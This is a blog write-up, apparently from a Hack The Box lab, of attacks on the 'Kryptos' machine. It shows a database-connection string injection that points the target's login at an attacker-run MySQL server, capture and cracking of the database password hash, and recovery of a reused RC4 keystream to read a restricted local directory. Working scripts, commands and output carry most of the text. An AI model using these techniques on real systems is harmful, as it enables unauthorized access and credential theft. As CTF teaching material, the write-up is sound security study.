<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Kryptos - Hack The Box - hackcommander.io</title>
<meta name="description" content="I loved the Kryptos machine from Adamm and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I control. Next is some crypto with the RC4 stream cipher in the file encryptor web app to get access to a protected local web directory and an LFI vulnerability in the PHP code that let me read the source code. After, there’s an SQL injection and I use stacked queries with sqlite to gain write access and RCE by writing PHP code. After finding an encrypted vim file, I’ll exploit a vulnerability in the blowfish implementation to recover the plaintext and get SSH credentials. For the priv esc, I pop a root shell by evading an eval jail in a SUID python webserver and exploiting a broken PRNG implementation.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Kryptos - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-kryptos/">


  <meta property="og:description" content="I loved the Kryptos machine from Adamm and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I control. Next is some crypto with the RC4 stream cipher in the file encryptor web app to get access to a protected local web directory and an LFI vulnerability in the PHP code that let me read the source code. After, there’s an SQL injection and I use stacked queries with sqlite to gain write access and RCE by writing PHP code. After finding an encrypted vim file, I’ll exploit a vulnerability in the blowfish implementation to recover the plaintext and get SSH credentials. For the priv esc, I pop a root shell by evading an eval jail in a SUID python webserver and exploiting a broken PRNG implementation.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-kryptos/kryptos_logo.png">





  <meta property="article:published_time" content="2019-09-21T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-kryptos/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Posts</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Tags</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">About</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Kryptos - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Kryptos - Hack The Box">
    <meta itemprop="description" content="I loved the Kryptos machine from Adamm and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I control. Next is some crypto with the RC4 stream cipher in the file encryptor web app to get access to a protected local web directory and an LFI vulnerability in the PHP code that let me read the source code. After, there’s an SQL injection and I use stacked queries with sqlite to gain write access and RCE by writing PHP code. After finding an encrypted vim file, I’ll exploit a vulnerability in the blowfish implementation to recover the plaintext and get SSH credentials. For the priv esc, I pop a root shell by evading an eval jail in a SUID python webserver and exploiting a broken PRNG implementation.">
    <meta itemprop="datePublished" content="September 21, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Kryptos - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-09-21T00:00:00+02:00">September 21, 2019 </time> 
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-kryptos/kryptos_logo.png" alt=""></p>

<p>I loved the Kryptos machine from <a href="https://asimuntis.github.io/">Adamm</a> and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I control. Next is some crypto with the RC4 stream cipher in the file encryptor web app to get access to a protected local web directory and an LFI vulnerability in the PHP code that let me read the source code. After, there’s an SQL injection and I use stacked queries with sqlite to gain write access and RCE by writing PHP code. After finding an encrypted vim file, I’ll exploit a vulnerability in the blowfish implementation to recover the plaintext and get SSH credentials. For the priv esc, I pop a root shell by evading an eval jail in a SUID python webserver and exploiting a broken PRNG implementation.</p>

<h3 id="nmap">Nmap</h3>

<p>Not much to see here, standard Linux box with SSH and Apache.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- kryptos.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-06 19:01 EDT
Nmap scan report for kryptos.htb (10.10.10.129)
Host is up (0.012s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2c:b3:7e:10:fa:91:f3:6c:4a:cc:d7:f4:88:0f:08:90 (RSA)
|   256 0c:cd:47:2b:96:a2:50:5e:99:bf:bd:d0:de:05:5d:ed (ECDSA)
|_  256 e6:5a:cb:c8:dc:be:06:04:cf:db:3a:96:e7:5a:d5:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cryptor Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h3 id="web---1st-part-login-page">Web - 1st part (login page)</h3>

<p>The web page contains a simple login form with a username and password.</p>

<p><img src="/assets/images/htb-writeup-kryptos/web.png" alt=""></p>

<p>I tried guessing a few credentials and always got a <code class="language-plaintext highlighter-rouge">Nope.</code> message:</p>

<p><img src="/assets/images/htb-writeup-kryptos/nope.png" alt=""></p>

<p>I see that the POST request passes the username and passwords as well as a CSRF token and a <code class="language-plaintext highlighter-rouge">db</code> value.</p>

<p><img src="/assets/images/htb-writeup-kryptos/post.png" alt=""></p>

<p>I ran gobuster and found a couple of interesting directories and files but I get a redirect to the login page everytime because I’m not logged in so I’ll need to bypass the login page first. That <code class="language-plaintext highlighter-rouge">/dev</code> folder gives me a 403 error so it’s probably only accessible locally or something.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php -t 50 -u http://kryptos.htb
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/aes.php (Status: 200)
/cgi-bin/ (Status: 403)
/cgi-bin/.php (Status: 403)
/css (Status: 301)
/decrypt.php (Status: 302)
/dev (Status: 403)
/encrypt.php (Status: 302)
/index.php (Status: 200)
/logout.php (Status: 302)
/server-status (Status: 403)
/url.php (Status: 200)
</code></pre></div></div>

<p>Because this box is ranked <code class="language-plaintext highlighter-rouge">insane</code> difficulty, this is most likely not a login page that I can bypass with a simple SQL injection. After playing with some of the parameters with Burp I found that whenever I change the <code class="language-plaintext highlighter-rouge">db</code> parameter I get the following error message:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connection: close
Content-Type: text/html; charset=UTF-8

PDOException code: 1044
</code></pre></div></div>

<p>That CSRF token is annoying and makes the process of trying different parameters a pain in the ass while using Burp. I made a quick script to automate getting the CSRF token and testing different payloads:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/ust/bin/python
</span>
<span class="kn">import</span> <span class="nn">readline</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"Cookie"</span><span class="p">:</span> <span class="s">"PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi"</span> <span class="p">}</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://kryptos.htb"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
    <span class="n">csrf</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"input"</span><span class="p">,</span> <span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"token"</span><span class="p">})[</span><span class="s">"value"</span><span class="p">]</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"username"</span><span class="p">:</span> <span class="s">"user"</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span> <span class="s">"pass"</span><span class="p">,</span> <span class="s">"db"</span><span class="p">:</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">"token"</span><span class="p">:</span> <span class="n">csrf</span><span class="p">,</span> <span class="s">"login"</span><span class="p">:</span> <span class="s">""</span><span class="p">}</span>
    <span class="k">print</span> <span class="n">data</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://kryptos.htb"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
</code></pre></div></div>

<p>Sample output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python db.py
&gt; invalid
{'username': 'user', 'token': u'9c73104a5a7aa15ffea40720928c9dc481fd85d2b42c5b102e123c2b2de1c7d6', 'password': 'pass', 'db': 'invalid', 'login': ''}
PDOException code: 1044
&gt; test
{'username': 'user', 'token': u'9c73104a5a7aa15ffea40720928c9dc481fd85d2b42c5b102e123c2b2de1c7d6', 'password': 'pass', 'db': 'test', 'login': ''}
PDOException code: 1044
</code></pre></div></div>

<p>According to the <a href="https://www.php.net/manual/en/intro.pdo.php">PDO documentation</a>:</p>

<blockquote>
  <p>The PHP Data Objects (PDO) extension defines a lightweight, consistent interface for accessing databases in PHP. Each database driver that implements the PDO interface can expose database-specific features as regular extension functions.</p>
</blockquote>

<p>The <a href="https://www.php.net/manual/en/pdo.construct.php">PDO constructor</a> documentation shows a code example using PDO:</p>

<p><img src="/assets/images/htb-writeup-kryptos/pdo_example.png" alt=""></p>

<p>The DSN string contains the database name which I can pass in the login request. This looks like a potential injection point. If we can control the DSN string then we can potentially redirect the database connection to another host instead of the target server.</p>

<p>To verify this I started a netcat listener on my Kali VM on port 3306 and injected the following string: <code class="language-plaintext highlighter-rouge">;dbname=cryptor;host=10.10.14.23;</code></p>

<p><img src="/assets/images/htb-writeup-kryptos/mysql_callback.png" alt=""></p>

<p>The MySQL server connects back to me so that means I can capture the challenge and response pairs and then crack them offline. Metasploit already has a module for that: <code class="language-plaintext highlighter-rouge">server/capture/mysql</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 auxiliary(server/capture/mysql) &gt; show options

Module options (auxiliary/server/capture/mysql):

   Name        Current Setting                           Required  Description
   ----        ---------------                           --------  -----------
   CAINPWFILE                                            no        The local filename to store the hashes in Cain&amp;Abel format
   CHALLENGE   112233445566778899AABBCCDDEEFF1122334455  yes       The 16 byte challenge
   JOHNPWFILE  /root/htb/kryptos/mysqlpwd                no        The prefix to the local filename to store the hashes in JOHN format
   SRVHOST     0.0.0.0                                   yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     3306                                      yes       The local port to listen on.
   SRVVERSION  5.5.16                                    yes       The server version to report in the greeting response
   SSL         false                                     no        Negotiate SSL for incoming connections
   SSLCert                                               no        Path to a custom SSL certificate (default is randomly generated)

msf5 auxiliary(server/capture/mysql) &gt;
[+] 10.10.10.129:58670 - User: dbuser; Challenge: 112233445566778899aabbccddeeff1122334455; Response: 73def07da6fba5dcc1b19c918dbd998e0d1f3f9d; Database: cryptor
</code></pre></div></div>

<p>The hash was saved to the following file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat mysqlpwd_mysqlna
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
</code></pre></div></div>

<p>I’m able to crack the hash with hashcat: <code class="language-plaintext highlighter-rouge">krypt0n1te</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># john -w=/usr/share/wordlists/rockyou.txt mysqlpwd_mysqlna
Using default input encoding: UTF-8
Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
krypt0n1te       (dbuser)
</code></pre></div></div>

<p>I tried those credentials on the login page but as expected they don’t work because they’re the DB creds, not the actual user credentials in the database. Since I now control which database backend is used for authentication and I have the credentials, I can create a database on my own machine with a username/password that I control. This will allow me to pass the authentication and login in to the site.</p>

<p>First, I need to change the MySQL server configuration so the servers listens on all interface and not just localhost:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat /etc/mysql/mariadb.conf.d/50-server.cnf

# this is read by the standalone daemon and embedded servers
[server]

# this is only for the mysqld standalone daemon
[mysqld]

bind-address = 0.0.0.0
</code></pre></div></div>

<p>Next I created a database and guessed that the table name is <code class="language-plaintext highlighter-rouge">users</code> (we can see validate this anyways by checking the MySQL logs generated when the server connects to our database)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [(none)]&gt; create database cryptor;
Query OK, 1 row affected (0.00 sec)

MariaDB [(none)]&gt; use cryptor;
Database changed

MariaDB [cryptor]&gt; create table users (username varchar(255), password varchar(255));
Query OK, 0 rows affected (0.01 sec)

MariaDB [cryptor]&gt; insert into users (username, password) values ('snowscan', 'yolo1234');
Query OK, 1 row affected (0.00 sec)

MariaDB [cryptor]&gt; grant all privileges on cryptor.* to 'dbuser'@'%' identified by 'krypt0n1te';
Query OK, 0 rows affected (0.01 sec)

MariaDB [cryptor]&gt; flush privileges;
Query OK, 0 rows affected (0.01 sec)
</code></pre></div></div>

<p>I set up the Match and Replace function in Burp so I don’t need to fiddle with the Intercept every time:</p>

<p><img src="/assets/images/htb-writeup-kryptos/burp_replace.png" alt=""></p>

<p>I still got a <code class="language-plaintext highlighter-rouge">Nope.</code> message when logging in but I noticed in the MySQL logs that the SQL query is using the MD5 value of the password instead of the plaintext password.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:/var/log/mysql# tail -f *

33 Query SELECT username, password FROM users WHERE username='snowscan' AND password='5ba4e0731a6248ea222262e4a65a912b'
</code></pre></div></div>

<p>So I just modified the existing password entry with the MD5 value of <code class="language-plaintext highlighter-rouge">yolo1234</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [cryptor]&gt; update users set password='5ba4e0731a6248ea222262e4a65a912b' where username='snowscan';
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0
</code></pre></div></div>

<p>And now I can log in successfully:</p>

<p><img src="/assets/images/htb-writeup-kryptos/encryptor.png" alt=""></p>

<h3 id="web---2nd-part-crypto">Web - 2nd part (crypto)</h3>

<p>The web app encrypts files that are linked on the form with either <code class="language-plaintext highlighter-rouge">AES-CBC</code> or <code class="language-plaintext highlighter-rouge">RC4</code>. I don’t get to pick the key so I assume this is hardcoded in the code which I don’t have access to right now. I tried fuzzing the handler to use <code class="language-plaintext highlighter-rouge">file:///</code> or something like that and also tried to pick another cipher like <code class="language-plaintext highlighter-rouge">None</code> or <code class="language-plaintext highlighter-rouge">Null</code> but that didn’t work.</p>

<p>I don’t see any obvious way to exploit <code class="language-plaintext highlighter-rouge">AES-CBC</code> here but <code class="language-plaintext highlighter-rouge">RC4</code> is interesting because the key stream generated here is the same across all files we encrypt. To verify this I created three different files on my machine:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># echo AAAAAAAA &gt; 1
# echo AAAAAAAAAAAAAAAA &gt; 2
# echo AAAAAAAAAAAAAAAAAAAAAAAA &gt; 3
</code></pre></div></div>

<p>When I encrypt the files, I can clearly see that the same key stream is used across all 3 files since the beginning of the ciphertext is the same:</p>

<p><img src="/assets/images/htb-writeup-kryptos/rc4_1.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-kryptos/rc4_2.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-kryptos/rc4_3.png" alt=""></p>

<p>Here’s the base64 encoded ciphertext of the 3 files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GX+u3Xsraj9A
GX+u3Xsraj8L2vu3pnC2hfU=
GX+u3Xsraj8L2vu3pnC2hb52BXbRJNo4Vw==
</code></pre></div></div>

<p>The ciphertext is common across all three plaintexts so the encryption here is using a static key for generate the RC4 key stream. I can’t recover the key used to initialize RC4 but I can recover the XOR key stream since I control the plaintext and I also have the ciphertext. I just need to generate a large file, encrypt it with the web application and XOR the ciphertext with the original plaintext to recover the key stream. Then I can use the key stream to decrypt the ciphertext of other files.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python -c 'print "A" * 1000000' &gt; plaintext
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-kryptos/rc_4.png" alt=""></p>

<p>I saved the output to <code class="language-plaintext highlighter-rouge">ciphertext</code> on my machine, then used a script to XOR both plaintext and ciphertext and generate a key stream file.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/ust/bin/python
</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="k">def</span> <span class="nf">sxor</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'plaintext'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'ciphertext'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>

<span class="n">k</span> <span class="o">=</span> <span class="n">sxor</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'keystream'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
</code></pre></div></div>

<p>After generating the key stream, I wrote another script that issues request on the file encryptor and decrypts the output with the keystream file I generated.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">readline</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"Cookie"</span><span class="p">:</span> <span class="s">"PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi"</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">sxor</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">))</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Usage: decrypthttp.py &lt;url&gt;"</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"keystream"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">k</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://kryptos.htb/encrypt.php?cipher=RC4&amp;url=%s"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">"html.parser"</span><span class="p">)</span>
<span class="n">result_b64</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"textarea"</span><span class="p">).</span><span class="n">string</span>
<span class="k">if</span> <span class="n">result_b64</span><span class="p">:</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">result_b64</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">sxor</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">p</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"** Nothing returned **"</span>
</code></pre></div></div>

<p>The next step of the operation here is to exploit the file encryptor to read local files. By using the file encryptor I’m able to query that <code class="language-plaintext highlighter-rouge">/dev/</code> directory which I had found earlier but that gave me a 403 forbidden message.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py http://127.0.0.1/dev/
&lt;html&gt;
    &lt;head&gt;
    &lt;/head&gt;
    &lt;body&gt;
	&lt;div class="menu"&gt;
	    &lt;a href="index.php"&gt;Main Page&lt;/a&gt;
	    &lt;a href="index.php?view=about"&gt;About&lt;/a&gt;
	    &lt;a href="index.php?view=todo"&gt;ToDo&lt;/a&gt;
	&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>Fetching the two pages shown above:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py http://127.0.0.1/dev/index.php?view=about
    &lt;html&gt;
    &lt;head&gt;
    &lt;/head&gt;
    &lt;body&gt;
	&lt;div class="menu"&gt;
	    &lt;a href="index.php"&gt;Main Page&lt;/a&gt;
	    &lt;a href="index.php?view=about"&gt;About&lt;/a&gt;
	    &lt;a href="index.php?view=todo"&gt;ToDo&lt;/a&gt;
	&lt;/div&gt;
This is about page
&lt;/body&gt;
&lt;/html&gt;

# python decrypthttp.py http://127.0.0.1/dev/index.php?view=todo
&lt;html&gt;
    &lt;head&gt;
    &lt;/head&gt;
    &lt;body&gt;
	&lt;div class="menu"&gt;
	    &lt;a href="index.php"&gt;Main Page&lt;/a&gt;
	    &lt;a href="index.php?view=about"&gt;About&lt;/a&gt;
	    &lt;a href="index.php?view=todo"&gt;ToDo&lt;/a&gt;
	&lt;/div&gt;
&lt;h3&gt;ToDo List:&lt;/h3&gt;
1) Remove sqlite_test_page.php
&lt;br&gt;2) Remove world writable folder which was used for sqlite testing
&lt;br&gt;3) Do the needful
&lt;h3&gt; Done: &lt;/h3&gt;
1) Restrict access to /dev
&lt;br&gt;2) Disable dangerous PHP functions

&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>The next target seems to be <code class="language-plaintext highlighter-rouge">sqlite_test_page.php</code> but the page doesn’t seem to return much:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

